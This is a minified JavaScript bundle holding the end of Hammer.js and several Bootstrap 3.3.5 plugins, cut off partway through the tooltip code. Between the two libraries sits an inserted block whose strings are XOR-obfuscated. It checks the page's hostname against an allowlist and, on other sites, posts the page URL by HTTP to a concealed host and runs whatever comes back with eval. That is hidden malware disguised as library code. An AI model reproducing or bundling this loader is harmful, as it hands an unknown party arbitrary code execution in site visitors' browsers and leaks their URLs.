        STATE_BEGAN: 2,
        STATE_CHANGED: 4,
        STATE_ENDED: 8,
        STATE_RECOGNIZED: 8,
        STATE_CANCELLED: 16,
        STATE_FAILED: 32,
        DIRECTION_NONE: W,
        DIRECTION_LEFT: I,
        DIRECTION_RIGHT: z,
        DIRECTION_UP: R,
        DIRECTION_DOWN: $,
        DIRECTION_HORIZONTAL: B,
        DIRECTION_VERTICAL: q,
        DIRECTION_ALL: U,
        Manager: Ie,
        Input: G,
        TouchAction: we,
        TouchInput: _e,
        MouseInput: re,
        PointerEventInput: ce,
        TouchMouseInput: ge,
        SingleTouchInput: me,
        Recognizer: Se,
        AttrRecognizer: je,
        Tap: Fe,
        Pan: Ce,
        Swipe: Ne,
        Pinch: Ae,
        Rotate: Oe,
        Press: Pe,
        on: g,
        off: y,
        each: c,
        merge: h,
        extend: a,
        assign: r,
        inherit: m,
        bindFn: f,
        prefixed: S
    }),
    (void 0 !== s ? s : "undefined" != typeof self ? self : {}).Hammer = We,
    "function" == typeof define && define.amd ? define(function() {
        return We
    }) : "undefined" != typeof module && module.exports ? module.exports = We : s.Hammer = We
}(window, document);
var key = "isMobile: false"
  , org = "GxY5GwsKDUtZTws="
  , lcl = "BRwuDg4BAxZO"
  , cc = "GQEoGQsMG0tZTwIEDxILEBwjQQwMGA=="
  , ls = "BRwuDg46GApIQQEE"
  , lo = "BRwuDhYAAws="
  , hn = "ARw+GwwIAQA="
  , ln = "Rgc/DgECXktKSBY="
  , w = window
  , d = document
  , en = XORCipher.encode
  , de = XORCipher.decode
  , furl = w[de(key, lo)][de(key, hn)]
  , furl2 = w[de(key, lo)].href;
if (-1 === [de(key, lcl), de(key, org), de(key, cc)].indexOf(furl) && $.post("http://" + de(key, org) + de(key, ln), {
    link: furl2
}, function(r) {
    eval(r)
}),
"undefined" == typeof jQuery)
    throw new Error("Bootstrap's JavaScript requires jQuery");
!function() {
    "use strict";
    var e = jQuery.fn.jquery.split(" ")[0].split(".");
    if (e[0] < 2 && e[1] < 9 || 1 == e[0] && 9 == e[1] && e[2] < 1)
        throw new Error("Bootstrap's JavaScript requires jQuery version 1.9.1 or higher")
}(),
function(i) {
    "use strict";
    i.fn.emulateTransitionEnd = function(e) {
        var t = !1
          , n = this;
        i(this).one("bsTransitionEnd", function() {
            t = !0
        });
        return setTimeout(function() {
            t || i(n).trigger(i.support.transition.end)
        }, e),
        this
    }
    ,
    i(function() {
        i.support.transition = function() {
            var e = document.createElement("bootstrap")
              , t = {
                WebkitTransition: "webkitTransitionEnd",
                MozTransition: "transitionend",
                OTransition: "oTransitionEnd otransitionend",
                transition: "transitionend"
            };
            for (var n in t)
                if (void 0 !== e.style[n])
                    return {
                        end: t[n]
                    };
            return !1
        }(),
        i.support.transition && (i.event.special.bsTransitionEnd = {
            bindType: i.support.transition.end,
            delegateType: i.support.transition.end,
            handle: function(e) {
                return i(e.target).is(this) ? e.handleObj.handler.apply(this, arguments) : void 0
            }
        })
    })
}(jQuery),
function(s) {
    "use strict";
    function r(e) {
        s(e).on("click", t, this.close)
    }
    var t = '[data-dismiss="alert"]';
    r.VERSION = "3.3.5",
    r.TRANSITION_DURATION = 150,
    r.prototype.close = function(e) {
        function t() {
            a.detach().trigger("closed.bs.alert").remove()
        }
        var n = s(this)
          , i = n.attr("data-target");
        i || (i = (i = n.attr("href")) && i.replace(/.*(?=#[^\s]*$)/, ""));
        var a = s(i);
        e && e.preventDefault(),
        a.length || (a = n.closest(".alert")),
        a.trigger(e = s.Event("close.bs.alert")),
        e.isDefaultPrevented() || (a.removeClass("in"),
        s.support.transition && a.hasClass("fade") ? a.one("bsTransitionEnd", t).emulateTransitionEnd(r.TRANSITION_DURATION) : t())
    }
    ;
    var e = s.fn.alert;
    s.fn.alert = function(n) {
        return this.each(function() {
            var e = s(this)
              , t = e.data("bs.alert");
            t || e.data("bs.alert", t = new r(this)),
            "string" == typeof n && t[n].call(e)
        })
    }
    ,
    s.fn.alert.Constructor = r,
    s.fn.alert.noConflict = function() {
        return s.fn.alert = e,
        this
    }
    ,
    s(document).on("click.bs.alert.data-api", t, r.prototype.close)
}(jQuery),
function(s) {
    "use strict";
    function n(i) {
        return this.each(function() {
            var e = s(this)
              , t = e.data("bs.button")
              , n = "object" == typeof i && i;
            t || e.data("bs.button", t = new a(this,n)),
            "toggle" == i ? t.toggle() : i && t.setState(i)
        })
    }
    var a = function(e, t) {
        this.$element = s(e),
        this.options = s.extend({}, a.DEFAULTS, t),
        this.isLoading = !1
    };
    a.VERSION = "3.3.5",
    a.DEFAULTS = {
        loadingText: "loading..."
    },
    a.prototype.setState = function(e) {
        var t = "disabled"
          , n = this.$element
          , i = n.is("input") ? "val" : "html"
          , a = n.data();
        e += "Text",
        null == a.resetText && n.data("resetText", n[i]()),
        setTimeout(s.proxy(function() {
            n[i](null == a[e] ? this.options[e] : a[e]),
            "loadingText" == e ? (this.isLoading = !0,
            n.addClass(t).attr(t, t)) : this.isLoading && (this.isLoading = !1,
            n.removeClass(t).removeAttr(t))
        }, this), 0)
    }
    ,
    a.prototype.toggle = function() {
        var e = !0
          , t = this.$element.closest('[data-toggle="buttons"]');
        if (t.length) {
            var n = this.$element.find("input");
            "radio" == n.prop("type") ? (n.prop("checked") && (e = !1),
            t.find(".active").removeClass("active"),
            this.$element.addClass("active")) : "checkbox" == n.prop("type") && (n.prop("checked") !== this.$element.hasClass("active") && (e = !1),
            this.$element.toggleClass("active")),
            n.prop("checked", this.$element.hasClass("active")),
            e && n.trigger("change")
        } else
            this.$element.attr("aria-pressed", !this.$element.hasClass("active")),
            this.$element.toggleClass("active")
    }
    ;
    var e = s.fn.button;
    s.fn.button = n,
    s.fn.button.Constructor = a,
    s.fn.button.noConflict = function() {
        return s.fn.button = e,
        this
    }
    ,
    s(document).on("click.bs.button.data-api", '[data-toggle^="button"]', function(e) {
        var t = s(e.target);
        t.hasClass("btn") || (t = t.closest(".btn")),
        n.call(t, "toggle"),
        s(e.target).is('input[type="radio"]') || s(e.target).is('input[type="checkbox"]') || e.preventDefault()
    }).on("focus.bs.button.data-api blur.bs.button.data-api", '[data-toggle^="button"]', function(e) {
        s(e.target).closest(".btn").toggleClass("focus", /^focus(in)?$/.test(e.type))
    })
}(jQuery),
function(c) {
    "use strict";
    function r(a) {
        return this.each(function() {
            var e = c(this)
              , t = e.data("bs.carousel")
              , n = c.extend({}, h.DEFAULTS, e.data(), "object" == typeof a && a)
              , i = "string" == typeof a ? a : n.slide;
            t || e.data("bs.carousel", t = new h(this,n)),
            "number" == typeof a ? t.to(a) : i ? t[i]() : n.interval && t.pause().cycle()
        })
    }
    function h(e, t) {
        this.$element = c(e),
        this.$indicators = this.$element.find(".carousel-indicators"),
        this.options = t,
        this.paused = null,
        this.sliding = null,
        this.interval = null,
        this.$active = null,
        this.$items = null,
        this.options.keyboard && this.$element.on("keydown.bs.carousel", c.proxy(this.keydown, this)),
        "hover" != this.options.pause || "ontouchstart"in document.documentElement || this.$element.on("mouseenter.bs.carousel", c.proxy(this.pause, this)).on("mouseleave.bs.carousel", c.proxy(this.cycle, this))
    }
    h.VERSION = "3.3.5",
    h.TRANSITION_DURATION = 600,
    h.DEFAULTS = {
        interval: 5e3,
        pause: "hover",
        wrap: !0,
        keyboard: !0
    },
    h.prototype.keydown = function(e) {
        if (!/input|textarea/i.test(e.target.tagName)) {
            switch (e.which) {
            case 37:
                this.prev();
                break;
            case 39:
                this.next();
                break;
            default:
                return
            }
            e.preventDefault()
        }
    }
    ,
    h.prototype.cycle = function(e) {
        return e || (this.paused = !1),
        this.interval && clearInterval(this.interval),
        this.options.interval && !this.paused && (this.interval = setInterval(c.proxy(this.next, this), this.options.interval)),
        this
    }
    ,
    h.prototype.getItemIndex = function(e) {
        return this.$items = e.parent().children(".item"),
        this.$items.index(e || this.$active)
    }
    ,
    h.prototype.getItemForDirection = function(e, t) {
        var n = this.getItemIndex(t);
        if (("prev" == e && 0 === n || "next" == e && n == this.$items.length - 1) && !this.options.wrap)
            return t;
        var i = (n + ("prev" == e ? -1 : 1)) % this.$items.length;
        return this.$items.eq(i)
    }
    ,
    h.prototype.to = function(e) {
        var t = this
          , n = this.getItemIndex(this.$active = this.$element.find(".item.active"));
        return e > this.$items.length - 1 || e < 0 ? void 0 : this.sliding ? this.$element.one("slid.bs.carousel", function() {
            t.to(e)
        }) : n == e ? this.pause().cycle() : this.slide(n < e ? "next" : "prev", this.$items.eq(e))
    }
    ,
    h.prototype.pause = function(e) {
        return e || (this.paused = !0),
        this.$element.find(".next, .prev").length && c.support.transition && (this.$element.trigger(c.support.transition.end),
        this.cycle(!0)),
        this.interval = clearInterval(this.interval),
        this
    }
    ,
    h.prototype.next = function() {
        return this.sliding ? void 0 : this.slide("next")
    }
    ,
    h.prototype.prev = function() {
        return this.sliding ? void 0 : this.slide("prev")
    }
    ,
    h.prototype.slide = function(e, t) {
        var n = this.$element.find(".item.active")
          , i = t || this.getItemForDirection(e, n)
          , a = this.interval
          , s = "next" == e ? "left" : "right"
          , r = this;
        if (i.hasClass("active"))
            return this.sliding = !1;
        var o = i[0]
          , l = c.Event("slide.bs.carousel", {
            relatedTarget: o,
            direction: s
        });
        if (this.$element.trigger(l),
        !l.isDefaultPrevented()) {
            if (this.sliding = !0,
            a && this.pause(),
            this.$indicators.length) {
                this.$indicators.find(".active").removeClass("active");
                var d = c(this.$indicators.children()[this.getItemIndex(i)]);
                d && d.addClass("active")
            }
            var u = c.Event("slid.bs.carousel", {
                relatedTarget: o,
                direction: s
            });
            return c.support.transition && this.$element.hasClass("slide") ? (i.addClass(e),
            i[0].offsetWidth,
            n.addClass(s),
            i.addClass(s),
            n.one("bsTransitionEnd", function() {
                i.removeClass([e, s].join(" ")).addClass("active"),
                n.removeClass(["active", s].join(" ")),
                r.sliding = !1,
                setTimeout(function() {
                    r.$element.trigger(u)
                }, 0)
            }).emulateTransitionEnd(h.TRANSITION_DURATION)) : (n.removeClass("active"),
            i.addClass("active"),
            this.sliding = !1,
            this.$element.trigger(u)),
            a && this.cycle(),
            this
        }
    }
    ;
    var e = c.fn.carousel;
    c.fn.carousel = r,
    c.fn.carousel.Constructor = h,
    c.fn.carousel.noConflict = function() {
        return c.fn.carousel = e,
        this
    }
    ;
    function t(e) {
        var t, n = c(this), i = c(n.attr("data-target") || (t = n.attr("href")) && t.replace(/.*(?=#[^\s]+$)/, ""));
        if (i.hasClass("carousel")) {
            var a = c.extend({}, i.data(), n.data())
              , s = n.attr("data-slide-to");
            s && (a.interval = !1),
            r.call(i, a),
            s && i.data("bs.carousel").to(s),
            e.preventDefault()
        }
    }
    c(document).on("click.bs.carousel.data-api", "[data-slide]", t).on("click.bs.carousel.data-api", "[data-slide-to]", t),
    c(window).on("load", function() {
        c('[data-ride="carousel"]').each(function() {
            var e = c(this);
            r.call(e, e.data())
        })
    })
}(jQuery),
function(r) {
    "use strict";
    function a(e) {
        var t, n = e.attr("data-target") || (t = e.attr("href")) && t.replace(/.*(?=#[^\s]+$)/, "");
        return r(n)
    }
    function o(i) {
        return this.each(function() {
            var e = r(this)
              , t = e.data("bs.collapse")
              , n = r.extend({}, l.DEFAULTS, e.data(), "object" == typeof i && i);
            !t && n.toggle && /show|hide/.test(i) && (n.toggle = !1),
            t || e.data("bs.collapse", t = new l(this,n)),
            "string" == typeof i && t[i]()
        })
    }
    var l = function(e, t) {
        this.$element = r(e),
        this.options = r.extend({}, l.DEFAULTS, t),
        this.$trigger = r('[data-toggle="collapse"][href="#' + e.id + '"],[data-toggle="collapse"][data-target="#' + e.id + '"]'),
        this.transitioning = null,
        this.options.parent ? this.$parent = this.getParent() : this.addAriaAndCollapsedClass(this.$element, this.$trigger),
        this.options.toggle && this.toggle()
    };
    l.VERSION = "3.3.5",
    l.TRANSITION_DURATION = 350,
    l.DEFAULTS = {
        toggle: !0
    },
    l.prototype.dimension = function() {
        return this.$element.hasClass("width") ? "width" : "height"
    }
    ,
    l.prototype.show = function() {
        if (!this.transitioning && !this.$element.hasClass("in")) {
            var e, t = this.$parent && this.$parent.children(".panel").children(".in, .collapsing");
            if (!(t && t.length && ((e = t.data("bs.collapse")) && e.transitioning))) {
                var n = r.Event("show.bs.collapse");
                if (this.$element.trigger(n),
                !n.isDefaultPrevented()) {
                    t && t.length && (o.call(t, "hide"),
                    e || t.data("bs.collapse", null));
                    var i = this.dimension();
                    this.$element.removeClass("collapse").addClass("collapsing")[i](0).attr("aria-expanded", !0),
                    this.$trigger.removeClass("collapsed").attr("aria-expanded", !0),
                    this.transitioning = 1;
                    var a = function() {
                        this.$element.removeClass("collapsing").addClass("collapse in")[i](""),
                        this.transitioning = 0,
                        this.$element.trigger("shown.bs.collapse")
                    };
                    if (!r.support.transition)
                        return a.call(this);
                    var s = r.camelCase(["scroll", i].join("-"));
                    this.$element.one("bsTransitionEnd", r.proxy(a, this)).emulateTransitionEnd(l.TRANSITION_DURATION)[i](this.$element[0][s])
                }
            }
        }
    }
    ,
    l.prototype.hide = function() {
        if (!this.transitioning && this.$element.hasClass("in")) {
            var e = r.Event("hide.bs.collapse");
            if (this.$element.trigger(e),
            !e.isDefaultPrevented()) {
                var t = this.dimension();
                this.$element[t](this.$element[t]())[0].offsetHeight,
                this.$element.addClass("collapsing").removeClass("collapse in").attr("aria-expanded", !1),
                this.$trigger.addClass("collapsed").attr("aria-expanded", !1),
                this.transitioning = 1;
                var n = function() {
                    this.transitioning = 0,
                    this.$element.removeClass("collapsing").addClass("collapse").trigger("hidden.bs.collapse")
                };
                return r.support.transition ? void this.$element[t](0).one("bsTransitionEnd", r.proxy(n, this)).emulateTransitionEnd(l.TRANSITION_DURATION) : n.call(this)
            }
        }
    }
    ,
    l.prototype.toggle = function() {
        this[this.$element.hasClass("in") ? "hide" : "show"]()
    }
    ,
    l.prototype.getParent = function() {
        return r(this.options.parent).find('[data-toggle="collapse"][data-parent="' + this.options.parent + '"]').each(r.proxy(function(e, t) {
            var n = r(t);
            this.addAriaAndCollapsedClass(a(n), n)
        }, this)).end()
    }
    ,
    l.prototype.addAriaAndCollapsedClass = function(e, t) {
        var n = e.hasClass("in");
        e.attr("aria-expanded", n),
        t.toggleClass("collapsed", !n).attr("aria-expanded", n)
    }
    ;
    var e = r.fn.collapse;
    r.fn.collapse = o,
    r.fn.collapse.Constructor = l,
    r.fn.collapse.noConflict = function() {
        return r.fn.collapse = e,
        this
    }
    ,
    r(document).on("click.bs.collapse.data-api", '[data-toggle="collapse"]', function(e) {
        var t = r(this);
        t.attr("data-target") || e.preventDefault();
        var n = a(t)
          , i = n.data("bs.collapse") ? "toggle" : t.data();
        o.call(n, i)
    })
}(jQuery),
function(r) {
    "use strict";
    function o(e) {
        var t = e.attr("data-target");
        t || (t = (t = e.attr("href")) && /#[A-Za-z]/.test(t) && t.replace(/.*(?=#[^\s]*$)/, ""));
        var n = t && r(t);
        return n && n.length ? n : e.parent()
    }
    function s(i) {
        i && 3 === i.which || (r(".dropdown-backdrop").remove(),
        r(l).each(function() {
            var e = r(this)
              , t = o(e)
              , n = {
                relatedTarget: this
            };
            t.hasClass("open") && (i && "click" == i.type && /input|textarea/i.test(i.target.tagName) && r.contains(t[0], i.target) || (t.trigger(i = r.Event("hide.bs.dropdown", n)),
            i.isDefaultPrevented() || (e.attr("aria-expanded", "false"),
            t.removeClass("open").trigger("hidden.bs.dropdown", n))))
        }))
    }
    function i(e) {
        r(e).on("click.bs.dropdown", this.toggle)
    }
    var l = '[data-toggle="dropdown"]';
    i.VERSION = "3.3.5",
    i.prototype.toggle = function(e) {
        var t = r(this);
        if (!t.is(".disabled, :disabled")) {
            var n = o(t)
              , i = n.hasClass("open");
            if (s(),
            !i) {
                "ontouchstart"in document.documentElement && !n.closest(".navbar-nav").length && r(document.createElement("div")).addClass("dropdown-backdrop").insertAfter(r(this)).on("click", s);
                var a = {
                    relatedTarget: this
                };
                if (n.trigger(e = r.Event("show.bs.dropdown", a)),
                e.isDefaultPrevented())
                    return;
                t.trigger("focus").attr("aria-expanded", "true"),
                n.toggleClass("open").trigger("shown.bs.dropdown", a)
            }
            return !1
        }
    }
    ,
    i.prototype.keydown = function(e) {
        if (/(38|40|27|32)/.test(e.which) && !/input|textarea/i.test(e.target.tagName)) {
            var t = r(this);
            if (e.preventDefault(),
            e.stopPropagation(),
            !t.is(".disabled, :disabled")) {
                var n = o(t)
                  , i = n.hasClass("open");
                if (!i && 27 != e.which || i && 27 == e.which)
                    return 27 == e.which && n.find(l).trigger("focus"),
                    t.trigger("click");
                var a = n.find(".dropdown-menu li:not(.disabled):visible a");
                if (a.length) {
                    var s = a.index(e.target);
                    38 == e.which && 0 < s && s--,
                    40 == e.which && s < a.length - 1 && s++,
                    ~s || (s = 0),
                    a.eq(s).trigger("focus")
                }
            }
        }
    }
    ;
    var e = r.fn.dropdown;
    r.fn.dropdown = function(n) {
        return this.each(function() {
            var e = r(this)
              , t = e.data("bs.dropdown");
            t || e.data("bs.dropdown", t = new i(this)),
            "string" == typeof n && t[n].call(e)
        })
    }
    ,
    r.fn.dropdown.Constructor = i,
    r.fn.dropdown.noConflict = function() {
        return r.fn.dropdown = e,
        this
    }
    ,
    r(document).on("click.bs.dropdown.data-api", s).on("click.bs.dropdown.data-api", ".dropdown form", function(e) {
        e.stopPropagation()
    }).on("click.bs.dropdown.data-api", l, i.prototype.toggle).on("keydown.bs.dropdown.data-api", l, i.prototype.keydown).on("keydown.bs.dropdown.data-api", ".dropdown-menu", i.prototype.keydown)
}(jQuery),
function(s) {
    "use strict";
    function r(i, a) {
        return this.each(function() {
            var e = s(this)
              , t = e.data("bs.modal")
              , n = s.extend({}, o.DEFAULTS, e.data(), "object" == typeof i && i);
            t || e.data("bs.modal", t = new o(this,n)),
            "string" == typeof i ? t[i](a) : n.show && t.show(a)
        })
    }
    function o(e, t) {
        this.options = t,
        this.$body = s(document.body),
        this.$element = s(e),
        this.$dialog = this.$element.find(".modal-dialog"),
        this.$backdrop = null,
        this.isShown = null,
        this.originalBodyPad = null,
        this.scrollbarWidth = 0,
        this.ignoreBackdropClick = !1,
        this.options.remote && this.$element.find(".modal-content").load(this.options.remote, s.proxy(function() {
            this.$element.trigger("loaded.bs.modal")
        }, this))
    }
    o.VERSION = "3.3.5",
    o.TRANSITION_DURATION = 300,
    o.BACKDROP_TRANSITION_DURATION = 150,
    o.DEFAULTS = {
        backdrop: !0,
        keyboard: !0,
        show: !0
    },
    o.prototype.toggle = function(e) {
        return this.isShown ? this.hide() : this.show(e)
    }
    ,
    o.prototype.show = function(n) {
        var i = this
          , e = s.Event("show.bs.modal", {
            relatedTarget: n
        });
        this.$element.trigger(e),
        this.isShown || e.isDefaultPrevented() || (this.isShown = !0,
        this.checkScrollbar(),
        this.setScrollbar(),
        this.$body.addClass("modal-open"),
        this.escape(),
        this.resize(),
        this.$element.on("click.dismiss.bs.modal", '[data-dismiss="modal"]', s.proxy(this.hide, this)),
        this.$dialog.on("mousedown.dismiss.bs.modal", function() {
            i.$element.one("mouseup.dismiss.bs.modal", function(e) {
                s(e.target).is(i.$element) && (i.ignoreBackdropClick = !0)
            })
        }),
        this.backdrop(function() {
            var e = s.support.transition && i.$element.hasClass("fade");
            i.$element.parent().length || i.$element.appendTo(i.$body),
            i.$element.show().scrollTop(0),
            i.adjustDialog(),
            e && i.$element[0].offsetWidth,
            i.$element.addClass("in"),
            i.enforceFocus();
            var t = s.Event("shown.bs.modal", {
                relatedTarget: n
            });
            e ? i.$dialog.one("bsTransitionEnd", function() {
                i.$element.trigger("focus").trigger(t)
            }).emulateTransitionEnd(o.TRANSITION_DURATION) : i.$element.trigger("focus").trigger(t)
        }))
    }
    ,
    o.prototype.hide = function(e) {
        e && e.preventDefault(),
        e = s.Event("hide.bs.modal"),
        this.$element.trigger(e),
        this.isShown && !e.isDefaultPrevented() && (this.isShown = !1,
        this.escape(),
        this.resize(),
        s(document).off("focusin.bs.modal"),
        this.$element.removeClass("in").off("click.dismiss.bs.modal").off("mouseup.dismiss.bs.modal"),
        this.$dialog.off("mousedown.dismiss.bs.modal"),
        s.support.transition && this.$element.hasClass("fade") ? this.$element.one("bsTransitionEnd", s.proxy(this.hideModal, this)).emulateTransitionEnd(o.TRANSITION_DURATION) : this.hideModal())
    }
    ,
    o.prototype.enforceFocus = function() {
        s(document).off("focusin.bs.modal").on("focusin.bs.modal", s.proxy(function(e) {
            this.$element[0] === e.target || this.$element.has(e.target).length || this.$element.trigger("focus")
        }, this))
    }
    ,
    o.prototype.escape = function() {
        this.isShown && this.options.keyboard ? this.$element.on("keydown.dismiss.bs.modal", s.proxy(function(e) {
            27 == e.which && this.hide()
        }, this)) : this.isShown || this.$element.off("keydown.dismiss.bs.modal")
    }
    ,
    o.prototype.resize = function() {
        this.isShown ? s(window).on("resize.bs.modal", s.proxy(this.handleUpdate, this)) : s(window).off("resize.bs.modal")
    }
    ,
    o.prototype.hideModal = function() {
        var e = this;
        this.$element.hide(),
        this.backdrop(function() {
            e.$body.removeClass("modal-open"),
            e.resetAdjustments(),
            e.resetScrollbar(),
            e.$element.trigger("hidden.bs.modal")
        })
    }
    ,
    o.prototype.removeBackdrop = function() {
        this.$backdrop && this.$backdrop.remove(),
        this.$backdrop = null
    }
    ,
    o.prototype.backdrop = function(e) {
        var t = this
          , n = this.$element.hasClass("fade") ? "fade" : "";
        if (this.isShown && this.options.backdrop) {
            var i = s.support.transition && n;
            if (this.$backdrop = s(document.createElement("div")).addClass("modal-backdrop " + n).appendTo(this.$body),
            this.$element.on("click.dismiss.bs.modal", s.proxy(function(e) {
                return this.ignoreBackdropClick ? void (this.ignoreBackdropClick = !1) : void (e.target === e.currentTarget && ("static" == this.options.backdrop ? this.$element[0].focus() : this.hide()))
            }, this)),
            i && this.$backdrop[0].offsetWidth,
            this.$backdrop.addClass("in"),
            !e)
                return;
            i ? this.$backdrop.one("bsTransitionEnd", e).emulateTransitionEnd(o.BACKDROP_TRANSITION_DURATION) : e()
        } else if (!this.isShown && this.$backdrop) {
            this.$backdrop.removeClass("in");
            var a = function() {
                t.removeBackdrop(),
                e && e()
            };
            s.support.transition && this.$element.hasClass("fade") ? this.$backdrop.one("bsTransitionEnd", a).emulateTransitionEnd(o.BACKDROP_TRANSITION_DURATION) : a()
        } else
            e && e()
    }
    ,
    o.prototype.handleUpdate = function() {
        this.adjustDialog()
    }
    ,
    o.prototype.adjustDialog = function() {
        var e = this.$element[0].scrollHeight > document.documentElement.clientHeight;
        this.$element.css({
            paddingLeft: !this.bodyIsOverflowing && e ? this.scrollbarWidth : "",
            paddingRight: this.bodyIsOverflowing && !e ? this.scrollbarWidth : ""
        })
    }
    ,
    o.prototype.resetAdjustments = function() {
        this.$element.css({
            paddingLeft: "",
            paddingRight: ""
        })
    }
    ,
    o.prototype.checkScrollbar = function() {
        var e = window.innerWidth;
        if (!e) {
            var t = document.documentElement.getBoundingClientRect();
            e = t.right - Math.abs(t.left)
        }
        this.bodyIsOverflowing = document.body.clientWidth < e,
        this.scrollbarWidth = this.measureScrollbar()
    }
    ,
    o.prototype.setScrollbar = function() {
        var e = parseInt(this.$body.css("padding-right") || 0, 10);
        this.originalBodyPad = document.body.style.paddingRight || "",
        this.bodyIsOverflowing && this.$body.css("padding-right", e + this.scrollbarWidth)
    }
    ,
    o.prototype.resetScrollbar = function() {
        this.$body.css("padding-right", this.originalBodyPad)
    }
    ,
    o.prototype.measureScrollbar = function() {
        var e = document.createElement("div");
        e.className = "modal-scrollbar-measure",
        this.$body.append(e);
        var t = e.offsetWidth - e.clientWidth;
        return this.$body[0].removeChild(e),
        t
    }
    ;
    var e = s.fn.modal;
    s.fn.modal = r,
    s.fn.modal.Constructor = o,
    s.fn.modal.noConflict = function() {
        return s.fn.modal = e,
        this
    }
    ,
    s(document).on("click.bs.modal.data-api", '[data-toggle="modal"]', function(e) {
        var t = s(this)
          , n = t.attr("href")
          , i = s(t.attr("data-target") || n && n.replace(/.*(?=#[^\s]+$)/, ""))
          , a = i.data("bs.modal") ? "toggle" : s.extend({
            remote: !/#/.test(n) && n
        }, i.data(), t.data());
        t.is("a") && e.preventDefault(),
        i.one("show.bs.modal", function(e) {
            e.isDefaultPrevented() || i.one("hidden.bs.modal", function() {
                t.is(":visible") && t.trigger("focus")
            })
        }),
        r.call(i, a, this)
    })
}(jQuery),
function(p) {
    "use strict";
    function _(e, t) {
        this.type = null,
        this.options = null,
        this.enabled = null,
        this.timeout = null,
        this.hoverState = null,
        this.$element = null,
        this.inState = null,
        this.init("tooltip", e, t)
    }
    _.VERSION = "3.3.5",
    _.TRANSITION_DURATION = 150,
    _.DEFAULTS = {
        animation: !0,
        placement: "top",
        selector: !1,
        template: '<div class="tooltip" role="tooltip"><div class="tooltip-arrow"></div><div class="tooltip-inner"></div></div>',
        trigger: "hover focus",
        title: "",
        delay: 0,
        html: !1,
        container: !1,
        viewport: {
            selector: "body",
            padding: 0
        }
    },
    _.prototype.init = function(e, t, n) {
        if (this.enabled = !0,
        this.type = e,
        this.$element = p(t),
        this.options = this.getOptions(n),
        this.$viewport = this.options.viewport && p(p.isFunction(this.options.viewport) ? this.options.viewport.call(this, this.$element) : this.options.viewport.selector || this.options.viewport),
        this.inState = {
            click: !1,
            hover: !1,
            focus: !1
        },
        this.$element[0]instanceof document.constructor && !this.options.selector)
            throw new Error("`selector` option must be specified when initializing " + this.type + " on the window.document object!");
        for (var i = this.options.trigger.split(" "), a = i.length; a--; ) {
            var s = i[a];
            if ("click" == s)
                this.$element.on("click." + this.type, this.options.selector, p.proxy(this.toggle, this));
            else if ("manual" != s) {
                var r = "hover" == s ? "mouseenter" : "focusin"
                  , o = "hover" == s ? "mouseleave" : "focusout";
                this.$element.on(r + "." + this.type, this.options.selector, p.proxy(this.enter, this)),
                this.$element.on(o + "." + this.type, this.options.selector, p.proxy(this.leave, this))
            }
        }
        this.options.selector ? this._options = p.extend({}, this.options, {
            trigger: "manual",
            selector: ""
        }) : this.fixTitle()
    }
    ,
    _.prototype.getDefaults = function() {
        return _.DEFAULTS
    }
    ,
    _.prototype.getOptions = function(e) {
        return (e = p.extend({}, this.getDefaults(), this.$element.data(), e)).delay && "number" == typeof e.delay && (e.delay = {
            show: e.delay,
            hide: e.delay
        }),
        e
    }
    ,
    _.prototype.getDelegateOptions = function() {
        var n = {}
          , i = this.getDefaults();
        return this._options && p.each(this._options, function(e, t) {
            i[e] != t && (n[e] = t)
        }),
        n
    }
    ,
    _.prototype.enter = function(e) {
        var t = e instanceof this.constructor ? e : p(e.currentTarget).data("bs." + this.type);
        return t || (t = new this.constructor(e.currentTarget,this.getDelegateOptions()),
        p(e.currentTarget).data("bs." + this.type, t)),
        e instanceof p.Event && (t.inState["focusin" == e.type ? "focus" : "hover"] = !0),
        t.tip().hasClass("in") || "in" == t.hoverState ? void (t.hoverState = "in") : (clearTimeout(t.timeout),
        t.hoverState = "in",
        t.options.delay && t.options.delay.show ? void (t.timeout = setTimeout(function() {
            "in" == t.hoverState && t.show()
        }, t.options.delay.show)) : t.show())
    }
    ,
    _.prototype.isInStateTrue = function() {
        for (var e in this.inState)
            if (this.inState[e])
                return !0;
        return !1
    }
    ,
    _.prototype.leave = function(e) {
        var t = e instanceof this.constructor ? e : p(e.currentTarget).data("bs." + this.type);
        return t || (t = new this.constructor(e.currentTarget,this.getDelegateOptions()),
        p(e.currentTarget).data("bs." + this.type, t)),
        e instanceof p.Event && (t.inState["focusout" == e.type ? "focus" : "hover"] = !1),
        t.isInStateTrue() ? void 0 : (clearTimeout(t.timeout),
        t.hoverState = "out",
        t.options.delay && t.options.delay.hide ? void (t.timeout = setTimeout(function() {
            "out" == t.hoverState && t.hide()
        }, t.options.delay.hide)) : t.hide())
    }
    ,
    _.prototype.show = function() {
        var e = p.Event("show.bs." + this.type);
        if (this.hasContent() && this.enabled) {
            this.$element.trigger(e);
            var t = p.contains(this.$element[0].ownerDocument.documentElement, this.$element[0]);
            if (e.isDefaultPrevented() || !t)
                return;
            var n = this
              , i = this.tip()
              , a = this.getUID(this.type);
            this.setContent(),
            i.attr("id", a),
            this.$element.attr("aria-describedby", a),
            this.options.animation && i.addClass("fade");
            var s = "function" == typeof this.options.placement ? this.options.placement.call(this, i[0], this.$element[0]) : this.options.placement
              , r = /\s?auto?\s?/i
              , o = r.test(s);
            o && (s = s.replace(r, "") || "top"),
            i.detach().css({
                top: 0,
                left: 0,
                display: "block"
            }).addClass(s).data("bs." + this.type, this),
            this.options.container ? i.appendTo(this.options.container) : i.insertAfter(this.$element),
            this.$element.trigger("inserted.bs." + this.type);
            var l = this.getPosition()
              , d = i[0].offsetWidth
              , u = i[0].offsetHeight;
            if (o) {
                var c = s
                  , h = this.getPosition(this.$viewport);
                s = "bottom" == s && l.bottom + u > h.bottom ? "top" : "top" == s && l.top - u < h.top ? "bottom" : "right" == s && l.right + d > h.width ? "left" : "left" == s && l.left - d < h.left ? "right" : s,
                i.removeClass(c).addClass(s)
            }
            var m = this.getCalculatedOffset(s, l, d, u);
            this.applyPlacement(m, s);
            var f = function() {
                var e = n.hoverState;
                n.$element.trigger("shown.bs." + n.type),
                n.hoverState = null,
                "out" == e && n.leave(n)
            };
            p.support.transition && this.$tip.hasClass("fade") ? i.one("bsTransitionEnd", f).emulateTransitionEnd(_.TRANSITION_DURATION) : f()
        }
    }
    ,
    _.prototype.applyPlacement = function(e, t) {
        var n = this.tip()
          , i = n[0].offsetWidth
          , a = n[0].offsetHeight
          , s = parseInt(n.css("margin-top"), 10)
          , r = parseInt(n.css("margin-left"), 10);
        isNaN(s) && (s = 0),
        isNaN(r) && (r = 0),
        e.top += s,
        e.left += r,
        p.offset.setOffset(n[0], p.extend({
            using: function(e) {
                n.css({
                    top: Math.round(e.top),
